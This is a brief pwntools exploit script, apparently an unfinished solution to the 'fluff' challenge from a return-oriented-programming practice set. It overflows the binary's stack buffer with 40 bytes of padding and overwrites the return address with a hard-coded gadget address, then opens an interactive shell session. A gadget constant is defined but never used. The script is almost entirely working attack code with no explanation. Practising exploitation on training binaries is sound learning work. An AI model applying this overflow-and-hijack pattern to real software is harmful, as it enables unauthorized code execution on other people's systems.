from pwn import *

elf = context.binary = ELF('./fluff')
context.terminal = ['tmux', 'splitw', '-h']
if args.REMOTE:
    conn = remote("n/A", 10305)
elif args.GDB:
    conn = gdb.debug([elf.path], gdbscript='''
    b main
    ''')
else:
    conn = elf.process()


POP_RDI = 0X4006a3
conn.send(b'A'*40 + p64(0x400510))
conn.interactive()